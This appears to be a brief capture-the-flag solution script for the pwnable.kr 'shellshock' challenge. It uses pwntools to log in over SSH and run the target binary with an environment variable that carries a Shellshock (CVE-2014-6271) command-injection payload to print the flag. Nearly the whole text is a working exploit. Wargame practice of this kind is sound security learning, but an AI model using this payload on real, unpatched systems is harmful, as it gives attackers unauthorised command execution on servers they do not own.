from pwn import *

con = ssh("shellshock", "pwnable.kr", 2222, "guest")
env = {"var": "() { :;}; ./bash -c 'cat flag'"}
sh = con.process(executable="/home/shellshock/shellshock", env=env)
print(sh.recvline())

# only if I knew CVE-2014-6271 ten years ago..!!
